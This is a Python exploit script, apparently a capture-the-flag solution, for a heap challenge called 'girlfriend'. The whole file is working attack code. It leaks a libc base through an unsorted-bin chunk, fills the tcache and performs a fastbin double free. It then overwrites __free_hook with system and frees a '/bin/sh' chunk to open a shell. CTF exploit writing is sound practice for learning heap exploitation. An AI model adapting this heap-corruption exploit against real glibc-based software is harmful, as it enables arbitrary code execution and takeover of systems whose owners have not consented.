# File: exp.py
# Author: raycp
# Date: 2019-06-06
# Description: exp for girlfriend, bypass double free check for tcache in glibc 2.29

from pwn_debug import *


pdbg=pwn_debug("./chall")

pdbg.context.terminal=['tmux', 'splitw', '-h']

#pdbg.local()
pdbg.debug("2.27")
#pdbg.remote('127.0.0.1', 22)
#p=pdbg.run("local")
#p=pdbg.run("remote")
p=pdbg.run("debug")

membp=pdbg.membp
#print hex(membp.elf_base),hex(membp.libc_base)
elf=pdbg.elf
libc=pdbg.libc

#io_file=IO_FILE_plus()
#io_file.show()


def add(size,name,phone):
    p.recvuntil("choice:")
    p.sendline("1")
    p.recvuntil("girl's name")
    p.sendline(str(size))
    p.recvuntil("her name:")
    p.send(name)
    p.recvuntil("call:")
    p.send(phone)

def show(idx):
    p.recvuntil("choice:")
    p.sendline("2")
    p.recvuntil("index:")
    p.sendline(str(idx))


def call(idx):
    p.recvuntil("choice:")
    p.sendline("4")
    p.recvuntil("index:")
    p.sendline(str(idx))

def pwn():
    
    #pdbg.bp()
    add(0x420,'1','123')
    
    add(0x60, '/bin/sh\x00','123')
    add(0x60, '1','123')
    for i in range(7):
        add(0x60,'/bin/sh\x00','123')

    # step 1 leak address by free chunk with size 0x420 which will directly go into unsorted bin
    call(0)
    show(0)
    p.recvuntil("name:\n")
    leak_libc=u64(p.recvuntil("\n")[:-1].ljust(8,'\x00'))
    libc_base=leak_libc-libc.symbols['main_arena']-0x60
    free_hook=libc_base+libc.symbols['__free_hook']
    system_addr=libc_base+libc.symbols['system']
    log.info("leak libc base: %s"%(hex(libc_base)))

    # step 2 fill the tcache chain
    for i in range(0,7):
        call(3+i)

    # step 3 fastbin attack
    call(1)
    call(2)
    call(1)

    # step 4 clean the tcache chain
    for i in range(0,7):
        add(0x60,'/bin/sh\x00','123')
    #pdbg.bp(0xc0a)

    # step 5 fastbin will go into tcache which will form tcache attack
    add(0x60,p64(free_hook),'123')

    add(0x60,'a','1')
    add(0x60,'b','1')

    # step 6 malloc out free_hook and write system address into it.
    add(0x60,p64(system_addr),'1')

    # step 7 trigger free to get shell
    call(5)
    p.interactive() 

if __name__ == '__main__':
    pwn()


